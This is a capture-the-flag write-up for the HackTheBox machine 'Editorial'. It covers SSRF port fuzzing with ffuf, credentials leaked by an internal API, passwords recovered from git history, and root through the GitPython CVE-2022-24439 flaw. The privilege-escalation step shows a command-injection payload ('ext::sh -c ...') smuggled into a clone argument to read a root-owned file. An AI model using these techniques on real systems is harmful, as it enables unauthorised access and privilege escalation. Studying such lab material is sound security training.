---
description: >-
  (User: SSRF Vulerability via Burp > Root: Enumeration of Git > gitpython
  exploit for root.)
---

# Editorial

Knowing that HTB machines usually have some web app on port 80, even before running an nmap scan I check whether there is a domain redirect:

```bash
curl http://10.10.11.20 -v
```

And we have the results:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2Fydonba-Ns8-TtNiFmH_HC.png\&w=3840\&q=75)

To explore this web app, I added `10.10.11.20` to my hosts file:

```bash
sudo bash -c "echo '10.10.11.20 editorial.htb' >> /etc/hosts"
```

So now we can explore the web app. While I do that in the background, I still launch an nmap scan, just in case there is something else:

```bash
nmap -vv -A -Pn -p- 10.10.11.252 -sV
```

The web app looks basic, and the source code doesn't reveal anything that stands out. What looks promising is a page at `http://editorial.htb/upload` with a web form. I fired up Burp Suite and started poking around.

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FlX_93Gn1HCZle2MaW2L2h.png\&w=3840\&q=75)

The form action executed on **Send book info** doesn't stand out, but the cover preview load could hold some vulnerabilities. I uploaded an image to see whether its metadata would reveal something like a buggy ImageMagick version, but nothing came up.

There is also an input that takes a URL and supposedly loads an image from the web and shows its miniature.

After some fruitless experiments, I decided to check whether this form could fetch something from the server. The request itself is multipart form-data, and when a localhost IP is submitted it responds with the placeholder image:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FKJYb6Ste-YFaPZXvubWhn.png\&w=3840\&q=75)

But what if there's some other web app on a different port running?

Since Burp Intruder is so slow, it would take forever to fuzz, so I used `ffuf` to do a quick fuzzing.

I saved the raw request to `request.txt`, generated a file `ports.txt` with ports from 1 to 65536 on separate lines, and started the scan:

```bash
ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt
```

Standard response length is 61:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FfT1p6F8O9hVHqEEkJcDyR.png\&w=3840\&q=75)

So to filter it out, I added a filter to `ffuf`:

```bash
ffuf -u http://editorial.htb/upload-cover -X POST -request request.txt -w ports.txt -fs 61
```

And it looks like port 5000 is open to localhost-based requests.

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2Foz-zvMHdgvwF8Ut3chIjp.png\&w=3840\&q=75)

Now to check what's there:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2F2QQeE3Vxoa6JQrok-HORt.png\&w=3840\&q=75)

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FgdOsraIpJ85ex8qtVmpl5.png\&w=3840\&q=75)

Download and open this file, and I finally got some useful data.

It looks like an API response with a list of methods. One of them is particularly useful because it has some credentials:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FpJNXiZrquncX5tZw3m7L0.png\&w=3840\&q=75)

I tried to SSH in with this `l:p` and succeeded, so we got the user flag:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FlevatwXzfB8fRok6CrX_j.png\&w=3840\&q=75)

Sadly, but expectedly, user `dev` doesn't have `sudo` capabilities.

## Privilege escalation

Quick check of the `apps` dir. But git remembers everything, so I ran `git log` to see previous commits, and there they were. Then I checked out all five commits to scour through the files and look for more honey, and in `/home/dev/apps/app_api/app.py` in its previous version I found yet another set of creds, now for the `prod` user of this machine.

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FVy31J3VIFa3L8Y_VRtD_m.png\&w=3840\&q=75)

Now I can SSH or `su` to the `prod` user and look for a privesc vector there, and it looks promising from the start: `prod` has some limited `sudo` usage allowed:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FyIk9nHbeiU8DoCLpQnkCt.png\&w=3840\&q=75)

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2F6aFdZAW3ySTZC9U0JlcZo.png\&w=3840\&q=75)

So it seems that user `prod` can run a Python script that copies over a `.git` repo from remote, and there are some external protocols allowed. I did hit a rabbit hole with these protocols. I spent some time fruitlessly trying to make this script use a custom protocol I wrote as per git specs, but this little part in `sudo` wrecked that plan:

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2Fu4nJWkIISkHHXl1rDyDgE.png\&w=3840\&q=75)

`env_reset` means that before the `sudo` command is executed, the environment and `$PATH` are reset to secure values, and my custom protocol needs to be on the path. Bummer.

So I started to poke around and google versions of things I found on the system in hopes that something is outdated and vulnerable. And it is, though not my first choice: I ran `pip3 list`.

![](https://mirror.xyz/_next/image?url=https%3A%2F%2Fimages.mirror-media.xyz%2Fpublication-images%2FRh24XzvIQjqkOHu1uJ5XQ.png\&w=3840\&q=75)

`GitPython 3.1.29` has a bug listed as `CVE-2022-24439` that allows an attacker to execute arbitrary code like this:

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'
```

The `%` sign is used to escape the space character. What it does is send the output of `cat /root/root.txt` to the file `/tmp/root`, where it can be read by non-privileged users. And that gives the admin flag.
